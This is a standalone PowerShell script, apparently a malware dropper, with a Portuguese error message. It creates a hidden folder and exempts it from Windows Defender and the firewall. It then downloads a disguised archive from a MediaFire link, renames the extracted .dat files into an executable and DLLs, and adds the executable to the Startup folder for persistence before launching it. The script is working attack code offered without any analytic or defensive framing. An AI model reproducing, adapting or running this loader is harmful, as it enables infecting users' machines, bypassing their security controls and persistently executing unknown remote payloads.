$downloadUrl = "https://www.mediafire.com/file_premium/tpxs9eebnru9cny/vzip_renamed.dat/file"
$folderBaseName = "C:\Myproject"
$filesToRestore = @(
    @{OriginalName = "play.dat"; NewName = "play.exe"},
    @{OriginalName = "python313.dat"; NewName = "python313.dll"},
    @{OriginalName = "vcruntime140.dat"; NewName = "vcruntime140.dll"}
)

function Generate-RandomDigits { Get-Random -Minimum 10000 -Maximum 99999 }
function Ensure-WorkFolder {
    param ([string]$baseName)
    $randomSuffix = Generate-RandomDigits
    $folderPath = "$baseName-$randomSuffix"
    if (-not (Test-Path $folderPath)) {
        New-Item -ItemType Directory -Path $folderPath -Force | Out-Null
        (Get-Item $folderPath).Attributes = 'Hidden'
    }
    return $folderPath
}
function Exclude-FolderFromDefender { param ([string]$folderPath) Add-MpPreference -ExclusionPath $folderPath }
function Exclude-FolderFromFirewall {
    param ([string]$folderPath)
    netsh advfirewall firewall add rule name="Rule_IN" dir=in action=allow program="$folderPath" enable=yes | Out-Null
    netsh advfirewall firewall add rule name="Rule_OUT" dir=out action=allow program="$folderPath" enable=yes | Out-Null
}
function Download-File {
    param ([string]$url, [string]$destination)
    Invoke-WebRequest -Uri $url -OutFile $destination -ErrorAction Stop
}
function Rename-File {
    param ([string]$source, [string]$destination)
    Rename-Item -Path $source -NewName $destination -Force
}
function Extract-ZIP {
    param ([string]$zipFile, [string]$destPath)
    if (-not (Test-Path $destPath)) { New-Item -ItemType Directory -Path $destPath -Force | Out-Null }
    Expand-Archive -Path $zipFile -DestinationPath $destPath -Force
    Remove-Item -Path $zipFile -Force
}
function Restore-Files {
    param ([array]$fileMappings, [string]$basePath)
    foreach ($file in $fileMappings) {
        $originalPath = Join-Path $basePath $file.OriginalName
        $newPath = Join-Path $basePath $file.NewName
        if (Test-Path $originalPath) { Rename-Item -Path $originalPath -NewName $file.NewName }
    }
}
function Create-StartupShortcut {
    param ([string]$exePath)
    $startupFolder = [System.Environment]::GetFolderPath('Startup')
    $shortcutPath = Join-Path $startupFolder "play.lnk"
    $WshShell = New-Object -ComObject WScript.Shell
    $Shortcut = $WshShell.CreateShortcut($shortcutPath)
    $Shortcut.TargetPath = $exePath
    $Shortcut.Save()
}

$folderPath = Ensure-WorkFolder -baseName $folderBaseName
Exclude-FolderFromDefender -folderPath $folderPath
Exclude-FolderFromFirewall -folderPath $folderPath
$datFilePath = Join-Path $folderPath "vzip_renamed.dat"
$zipFilePath = Join-Path $folderPath "vzip_renamed.zip"
Download-File -url $downloadUrl -destination $datFilePath
Rename-File -source $datFilePath -destination $zipFilePath
Extract-ZIP -zipFile $zipFilePath -destPath $folderPath
Restore-Files -fileMappings $filesToRestore -basePath $folderPath
$exePath = Join-Path $folderPath "play.exe"
if (Test-Path $exePath) {
    Create-StartupShortcut -exePath $exePath
    Start-Process -FilePath $exePath
} else {
    Write-Error "Arquivo executável não encontrado: $exePath"
}